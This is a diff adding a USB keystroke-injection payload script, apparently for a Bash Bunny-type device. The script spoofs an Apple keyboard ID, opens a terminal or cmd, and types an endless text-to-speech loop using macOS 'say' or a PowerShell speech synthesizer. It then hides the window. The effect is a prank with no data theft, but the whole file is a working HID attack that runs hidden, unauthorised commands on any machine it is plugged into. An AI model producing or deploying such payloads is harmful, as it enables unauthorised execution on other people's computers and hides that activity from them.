@@ -1,0 +1,36 @@
+##Set attack mode
+LED SETUP
+ATTACKMODE HID VID_0X05AC PID_0X021E
+
+##Try OSX terminal
+LED STAGE1
+RUN OSX terminal
+
+##Try Win cmd
+RUN WIN cmd
+
+##Wait for OSX terminal. Sometimes takes a while.
+Q DELAY 2000
+
+##Try TTS on OSX
+Q STRING while true\; do say \"$textbody\"\; done\;
+Q DELAY 100
+Q ENTER
+
+##Try TTS on Win
+Q STRING PowerShell \-Command \"Add\-Type \-AssemblyName System\.Speech\; while \(\$true\) \{ \(New\-Object System\.Speech\.Synthesis\.SpeechSynthesizer\)\.Speak\(\'hello\'\)\;start\-sleep \-seconds 1\;\}\"
+Q DELAY 100
+Q ENTER
+
+##Try to hide the window on OSX
+Q GUI h
+
+##Try to hide the window on Win
+Q ALT SPACE
+Q STRING n
+
+#PowerShell -Command "Add-Type -AssemblyName System.Speech; while ($true) { (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('hello');start-sleep -seconds 1;}"
+
+
+##Done
+LED FINISH
